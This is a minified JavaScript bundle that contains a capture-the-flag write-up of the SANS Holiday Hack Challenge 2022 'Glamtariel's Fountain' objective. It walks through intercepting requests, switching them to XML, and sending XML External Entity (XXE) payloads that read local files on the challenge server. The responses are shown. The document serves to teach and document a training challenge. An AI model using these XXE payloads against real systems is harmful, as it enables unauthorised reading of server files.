"use strict";(self.webpackChunkkringlecon_2022=self.webpackChunkkringlecon_2022||[]).push([[5219],{3905:(e,t,n)=>{n.d(t,{Zo:()=>u,kt:()=>g});var a=n(7294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function o(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},i=Object.keys(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var s=a.createContext({}),p=function(e){var t=a.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):l(l({},t),e)),n},u=function(e){var t=p(e.components);return a.createElement(s.Provider,{value:t},e.children)},h={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},m=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,i=e.originalType,s=e.parentName,u=o(e,["components","mdxType","originalType","parentName"]),m=p(n),g=r,c=m["".concat(s,".").concat(g)]||m[g]||h[g]||i;return n?a.createElement(c,l(l({ref:t},u),{},{components:n})):a.createElement(c,l({ref:t},u))}));function g(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var i=n.length,l=new Array(i);l[0]=m;var o={};for(var s in t)hasOwnProperty.call(t,s)&&(o[s]=t[s]);o.originalType=e,o.mdxType="string"==typeof e?e:r,l[1]=o;for(var p=2;p<i;p++)l[p]=n[p];return a.createElement.apply(null,l)}return a.createElement.apply(null,n)}m.displayName="MDXCreateElement"},1834:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>l,default:()=>h,frontMatter:()=>i,metadata:()=>o,toc:()=>p});var a=n(7462),r=(n(7294),n(3905));const i={sidebar_position:6},l="Glamtariels Fountains",o={unversionedId:"writeup/WebRing/glamtariels_fountain",id:"writeup/WebRing/glamtariels_fountain",title:"Glamtariels Fountains",description:"This was maybe the most time-consuming objective of this edition of SANS Holiday Hack Challenge. Anyhow, it was a bit frustrating to figure out - but fun in the end.",source:"@site/docs/writeup/WebRing/glamtariels_fountain.md",sourceDirName:"writeup/WebRing",slug:"/writeup/WebRing/glamtariels_fountain",permalink:"/kringlecon-2022/writeup/WebRing/glamtariels_fountain",draft:!1,tags:[],version:"current",sidebarPosition:6,frontMatter:{sidebar_position:6},sidebar:"tutorialSidebar",previous:{title:"Open Boria Mine Door",permalink:"/kringlecon-2022/writeup/WebRing/open_boria_mine_door"},next:{title:"Recover Cloud Ring",permalink:"/kringlecon-2022/category/recover-cloud-ring"}},s={},p=[{value:"Hints",id:"hints",level:2},{value:"Making sense of the clues",id:"making-sense-of-the-clues",level:3},{value:"Solving",id:"solving",level:2},{value:"Figuring out game mechanics",id:"figuring-out-game-mechanics",level:3},{value:"Figuring out XML communication",id:"figuring-out-xml-communication",level:3},{value:"Figuring out the path",id:"figuring-out-the-path",level:3},{value:"Hint TRAFFIC FLIES",id:"hint-traffic-flies",level:4},{value:"Hint APP",id:"hint-app",level:4},{value:"Hint RINGLIST and SIMPLE FORMAT",id:"hint-ringlist-and-simple-format",level:4},{value:"XXE",id:"xxe",level:3}],u={toc:p};function h(e){let{components:t,...i}=e;return(0,r.kt)("wrapper",(0,a.Z)({},u,i,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"glamtariels-fountains"},"Glamtariels Fountains"),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"This was maybe the most time-consuming objective of this edition of SANS Holiday Hack Challenge. Anyhow, it was a bit frustrating to figure out - but fun in the end.")),(0,r.kt)("h2",{id:"hints"},"Hints"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Significant CASE\nFrom: Hal Tandybuck\nObjective: Glamtariel's Fountain\nEarly parts of this challenge can be solved by focusing on Glamtariel's WORDS.\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"eXternal Entities\nFrom: Hal Tandybuck\nObjective: Glamtariel's Fountain\nSometimes we can hit web pages with XXE when they aren't expecting it!\n")),(0,r.kt)("p",null,"The game is playable through URL ",(0,r.kt)("a",{parentName:"p",href:"https://glamtarielsfountain.com/"},"https://glamtarielsfountain.com/")),(0,r.kt)("p",null,"The dialogue for this game gives you various clues to solve this challenge. Clues found:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"TAMPER "),(0,r.kt)("li",{parentName:"ul"},"TRAFFIC FLIES"),(0,r.kt)("li",{parentName:"ul"},"PATH"),(0,r.kt)("li",{parentName:"ul"},"APP"),(0,r.kt)("li",{parentName:"ul"},"TYPE"),(0,r.kt)("li",{parentName:"ul"},"SIMPLE FORMAT")),(0,r.kt)("h3",{id:"making-sense-of-the-clues"},"Making sense of the clues"),(0,r.kt)("table",null,(0,r.kt)("thead",{parentName:"table"},(0,r.kt)("tr",{parentName:"thead"},(0,r.kt)("th",{parentName:"tr",align:null},"Clue"),(0,r.kt)("th",{parentName:"tr",align:null},"Text from game"),(0,r.kt)("th",{parentName:"tr",align:null},"Meaning"))),(0,r.kt)("tbody",{parentName:"table"},(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"TAMPER"),(0,r.kt)("td",{parentName:"tr",align:null},"Kringle really dislikes if anyone tries to TAMPER with the cookie recipe Glamtariel uses"),(0,r.kt)("td",{parentName:"tr",align:null},"Stay away from tampering with the cookies")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"TAMPER"),(0,r.kt)("td",{parentName:"tr",align:null},"I don't know why anyone would ever ask me to TAMPER with cookie recipe. I know just how Kringle likes them."),(0,r.kt)("td",{parentName:"tr",align:null},"Same as above")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"TRAFFIC FLIES"),(0,r.kt)("td",{parentName:"tr",align:null},"From water and cold new ice form Frozen spires from lakes will arise. Those shivering who weather the storm will learn from how the TRAFFIC FLIES"),(0,r.kt)("td",{parentName:"tr",align:null},"Look at network traffic to see what is served from where.")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"PATH"),(0,r.kt)("td",{parentName:"tr",align:null},"I helped the elves create the PATH here to make sure that only those invited can find their way here."),(0,r.kt)("td",{parentName:"tr",align:null},"Most content is served from the static/images folder")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"PATH"),(0,r.kt)("td",{parentName:"tr",align:null},"The elves do a great job making PATHs which are easy to follow once you see them"),(0,r.kt)("td",{parentName:"tr",align:null},"Most content is served from the static/images folder")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"PATH"),(0,r.kt)("td",{parentName:"tr",align:null},"Careful with the mountain! I know what you were wondering about there. It's no cause for concern. The PATH here is closed"),(0,r.kt)("td",{parentName:"tr",align:null},"Most content is served from the static/images folder")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"APP"),(0,r.kt)("td",{parentName:"tr",align:null},"Between Glamtariel and Kringle, many who have tried to find the PATH here uninvited have ended up very disAPPpointed. Please click away that ominous eye!"),(0,r.kt)("td",{parentName:"tr",align:null},'Might reflect the actual path being "app"')),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"TYPE"),(0,r.kt)("td",{parentName:"tr",align:null},"Did you know that I speak many TYPEs of languages? For simplicity, I usually only communicate with this one though"),(0,r.kt)("td",{parentName:"tr",align:null},"Communication happens on JSON by default, so maybe XML?")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"TYPE"),(0,r.kt)("td",{parentName:"tr",align:null},"I pretty much stick to just one TYPE of language, it's a lot easier to share things that way"),(0,r.kt)("td",{parentName:"tr",align:null},"Communication happens on JSON by default, so maybe XML?")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"TYPE"),(0,r.kt)("td",{parentName:"tr",align:null},"You know, I've heard Glamtariel talk in her sleep about rings using a different TYPE of language. She may be more responsive about them if you ask differently."),(0,r.kt)("td",{parentName:"tr",align:null},"Communication happens on JSON by default, so maybe XML?")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"SIMPLE FORMAT"),(0,r.kt)("td",{parentName:"tr",align:null},"I like to keep track of all my rings using a SIMPLE FORMAT, although I usually don't like to discuss such things"),(0,r.kt)("td",{parentName:"tr",align:null},"There are many simple formats. Txt and CSV for example.")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"RINGLIST"),(0,r.kt)("td",{parentName:"tr",align:null},"Wow!, what a beautiful silver ring! I don't have one of these. I keep a list of all my rings in my RINGLIST file. Wait a minute! Uh, promise me you won't tell anyone."),(0,r.kt)("td",{parentName:"tr",align:null},"We are looking for a ringlist")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"RINGLIST"),(0,r.kt)("td",{parentName:"tr",align:null},"I never heard Glamtariel mention a RINGLIST file before. If only there were a way to get a peek at that."),(0,r.kt)("td",{parentName:"tr",align:null},"We are looking for a ringlist")))),(0,r.kt)("h2",{id:"solving"},"Solving"),(0,r.kt)("h3",{id:"figuring-out-game-mechanics"},"Figuring out game mechanics"),(0,r.kt)("p",null,"Ok. This took me a while to figure out. In the upper right corner, some items can be dragged and dropped on either the princess or the fountain. When dropped X amount of times on both the princess and the fountain, then the items get swapped out and we need to repeat the process until a mysterious eye pops up:"),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Evil eye",src:n(1023).Z,width:"921",height:"604"})),(0,r.kt)("p",null,"This mysterious eye seems to play a vital role. More on that later. Clicking on it makes it go away, and then I resumed moving on dropping things, eventually, the items were swapped out by some rings: "),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Some rings",src:n(1382).Z,width:"921",height:"604"})),(0,r.kt)("p",null,'During this entire process, I was inspecting the requests in Burp Suite. I even tried to figure out how to communicate using XML, but the backend replied with responses like "it was ready yet". However, it appears that the eye once clicked away, opens up or enables XML communications. '),(0,r.kt)("h3",{id:"figuring-out-xml-communication"},"Figuring out XML communication"),(0,r.kt)("p",null,"The biggest hurdle of this assignment was figuring out how the communication happened. Whenever I come across such situations I prefer to route the traffic through Burp Suite Proxy to capture requests and then replay these requests through the Repeater. The following notes are a result of understanding the game mechanics and good old explorations. In this screenshot we see that whenever we drag an icon over to either the princess or the fountain, an HTTP POST request fires to the /dropped path:"),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"POST request to /dropped",src:n(3523).Z,width:"822",height:"623"})),(0,r.kt)("p",null,'The hint stated that we can communicate using a different language. The most nearby language I can think of is XML (if you could ever call it a language). So, I took the request from above and sent it to Repeater, then started to convert it to XML format. Converting to XML format is quick, but we must also remember to tell the web server we are sending XML. Therefore I set the "Content-Type" HTTP header field to value "application/xml":'),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"POST request to /dropped",src:n(7406).Z,width:"826",height:"705"})),(0,r.kt)("p",null,"It took some tries to get things in order, but eventually, the webserver started accepting my requests and spat out the following response:"),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"POST request to /dropped",src:n(6961).Z,width:"811",height:"378"})),(0,r.kt)("p",null,"I now had a working example of how to communicate using XML. I also made notice of the following HTTP header field in the response:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"Server: Werkzeug/2.2.2 Python/3.10.8\n")),(0,r.kt)("p",null,"This hints at the webserver being Flask, ref:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://werkzeug.palletsprojects.com/en/2.2.x/"},"https://werkzeug.palletsprojects.com/en/2.2.x/")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://flask.palletsprojects.com/en/2.2.x/installation/"},"https://flask.palletsprojects.com/en/2.2.x/installation/")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://pypi.org/project/Flask/"},"https://pypi.org/project/Flask/"))),(0,r.kt)("h3",{id:"figuring-out-the-path"},"Figuring out the path"),(0,r.kt)("p",null,"Figuring out the PATH hint wasn't easy, but the process went something like this:"),(0,r.kt)("h4",{id:"hint-traffic-flies"},"Hint TRAFFIC FLIES"),(0,r.kt)("p",null,"Thinking about this hint I started looking at how the traffic flows and where content is served from:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"/static/js/images-1.js"),(0,r.kt)("li",{parentName:"ul"},"/static/images/starrybackground.png"),(0,r.kt)("li",{parentName:"ul"},"/static/images/2022_glamtariel_2022.png"),(0,r.kt)("li",{parentName:"ul"},"/static/images/img1-1671256015953.png"),(0,r.kt)("li",{parentName:"ul"},"/dropped"),(0,r.kt)("li",{parentName:"ul"},"/static/images/stage2ring-eyecu_2022.png"),(0,r.kt)("li",{parentName:"ul"},"/static/images/grinchum-supersecret_9364274.png")),(0,r.kt)("p",null,"Most contents are served from /static/images, so it seemed worth to try focusing on this folder! "),(0,r.kt)("h4",{id:"hint-app"},"Hint APP"),(0,r.kt)("p",null,"Piecing together this I found out that we dealing with Flask webserver here, as hinted at in the response header:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"Server: Werkzeug/2.2.2 Python/3.10.8\n")),(0,r.kt)("p",null,"So I began looking at how to structure Flask projects and found this link: "),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://github.com/app-generator/tutorial-flask/blob/main/flask-project-structure.md"},"https://github.com/app-generator/tutorial-flask/blob/main/flask-project-structure.md"))),(0,r.kt)("p",null,'I found the answer I was looking for under the "Isolated app directory" section:'),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"<PROJECT ROOT>/app/images/static\n")),(0,r.kt)("h4",{id:"hint-ringlist-and-simple-format"},"Hint RINGLIST and SIMPLE FORMAT"),(0,r.kt)("p",null,"Putting together the hints so far gives me this path:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"app/static/images/\n")),(0,r.kt)("p",null,'The hints mention a ringlist represented in a simple format. I figure the filename itself is "ringlist". The file extension could either be ".txt" or ".csv" since both are simple formats. So that leaves me with the following paths:'),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"app/static/images/ringlist.txt\napp/static/images/ringlist.csv\n")),(0,r.kt)("p",null,"By looking at the content served from the web app, every filename was in lowercase. So I suppose the path I am looking for is also in lowercase."),(0,r.kt)("h3",{id:"xxe"},"XXE"),(0,r.kt)("p",null,"In this step we already know:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"How to communicate using XML"),(0,r.kt)("li",{parentName:"ul"},"What the PATH could be")),(0,r.kt)("p",null,"So, it is time to toy with XXE. Read up on XXE using the following links: "),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"},"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://portswigger.net/web-security/xxe"},"https://portswigger.net/web-security/xxe"))),(0,r.kt)("p",null,"And started to experiment. For the following POST requests, I have only included the payload and the response. Trying to access the ringlist: "),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-xml"},'<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt" >]>\n<bleh>\n<imgDrop>&xxe;</imgDrop>\n<who>princess</who>\n<reqType>xml</who>\n</bleh>\n')),(0,r.kt)("p",null,"Even though we sent the request in XML, we got an answer back in JSON"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-json"},'{\n  "appResp": "Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don\'t keep any secrets in it any more! Please though, don\'t tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)",\n  "droppedOn": "none",\n  "visit": "static/images/pholder-morethantopsupersecret63842.png,262px,100px"\n}\n')),(0,r.kt)("p",null,'This tells me to pay a visit to "pholder-morethantopsupersecret63842.png" in a web browser. Here\'s the file as viewed in a browser:'),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Secret image",src:n(4871).Z,width:"175",height:"139"})),(0,r.kt)("p",null,"The picture shows a folder ",(0,r.kt)("strong",{parentName:"p"},"x_phial_pholder_2022")," and two files:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"bluering.txt"),(0,r.kt)("li",{parentName:"ul"},"redring.txt")),(0,r.kt)("p",null,"Reaching out to redring.txt:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-xml"},'<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/redring.txt" >]>\n<bleh>\n<imgDrop>&xxe;</imgDrop>\n<who>princess</who>\n<reqType>xml</who>\n</bleh>\n')),(0,r.kt)("p",null,"Response"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-json"},'{\n  "appResp": "Hmmm, you still seem awfully interested in these rings. I can\'t blame you, they are pretty nice.^Oooooh, I can just tell she\'d like to talk about them some more.",\n  "droppedOn": "none",\n  "visit": "none"\n}\n')),(0,r.kt)("p",null,"Hmmm, nothing much. Trying blue ring"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-xml"},'<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/bluering.txt" >]>\n<bleh>\n<imgDrop>&xxe;</imgDrop>\n<who>princess</who>\n<reqType>xml</who>\n</bleh>\n')),(0,r.kt)("p",null,"Response"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-json"},'{\n  "appResp": "I love these fancy blue rings! You can see we have two of them. Not magical or anything, just really pretty.^She definitely tries to convince everyone that the blue ones are her favorites. I\'m not so sure though.",\n  "droppedOn": "none",\n  "visit": "none"\n}\n')),(0,r.kt)("p",null,"Trying silver ring for the kick of it:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-xml"},'<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/silverring.txt" >]>\n<bleh>\n<imgDrop>&xxe;</imgDrop>\n<who>princess</who>\n<reqType>xml</who>\n</bleh>\n')),(0,r.kt)("p",null,"Response"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-json"},'{\n  "appResp": "I\'d so love to add that silver ring to my collection, but what\'s this? Someone has defiled my red ring! Click it out of the way please!.^Can\'t say that looks good. Someone has been up to no good. Probably that miserable Grinchum!",\n  "droppedOn": "none",\n  "visit": "static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px"\n}\n')),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Secret red ring",src:n(1690).Z,width:"125",height:"138"})),(0,r.kt)("p",null,'Inside the ring, we find the inscription: "goldring_to_be_deleted.txt". Trying to access this text file:'),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-xml"},'\n<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt" >]>\n<bleh>\n<imgDrop>&xxe;</imgDrop>\n<who>princess</who>\n<reqType>xml</who>\n</bleh>\n')),(0,r.kt)("p",null,"Which returns"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-json"},'{\n  "appResp": "Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you\'ve made a pretty bold REQuest. That\'s ok, but even if I knew anything about such things, I\'d only use a secret TYPE of tongue to discuss them.^She\'s definitely hiding something.",\n  "droppedOn": "none",\n  "visit": "none"\n}\n')),(0,r.kt)("p",null,'This response hints at "bold REQuest" and "TYPE" - combined it spells out "REQTYPE". Oh. That tag, yes. It really hints to put the XXE inside that tag: '),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-xml"},'<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt" >]>\n<bleh>\n<imgDrop>img1</imgDrop>\n<who>princess</who>\n<reqType>&xxe;</who>\n</bleh>\n')),(0,r.kt)("p",null,"response"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-json"},'{\n  "appResp": "No, really I couldn\'t. Really? I can have the beautiful silver ring? I shouldn\'t, but if you insist, I accept! In return, behold, one of Kringle\'s golden rings! Grinchum dropped this one nearby. Makes one wonder how \'precious\' it really was to him. Though I haven\'t touched it myself, I\'ve been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!",\n  "droppedOn": "none",\n  "visit": "static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px"\n}\n')),(0,r.kt)("p",null,"Visiting that image yields"),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Gold ring",src:n(1041).Z,width:"124",height:"109"})),(0,r.kt)("p",null,"However, the answer to this objective is ",(0,r.kt)("strong",{parentName:"p"},"goldring-morethansupertopsecret76394734.png")))}h.isMDXComponent=!0},1023:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/glamtariel-1-73840c0752176a9cb135d9b079945282.png"},1382:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/glamtariel-2-ca909c07f7d384ee12bd90b71cd3a7c7.png"},1041:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/goldring-morethansupertopsecret76394734-22cb17d87ddfe1023a0753cced74f6cd.png"},4871:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/pholder-morethantopsupersecret63842-cb36c32fbd8d52b824131e7c76ffb9c1.png"},3523:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/post-dropped-1-710ace65676de9846e308f5eb9b990e3.png"},7406:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/post-dropped-2-57fc2b2f757a89d72e7900602c956e79.png"},6961:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/post-dropped-3-bab49d0339b8d5077e0d86afb55c8fe9.png"},1690:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/redring-supersupersecret928164-e376b07ba0b322ba9732c695e7556622.png"}}]);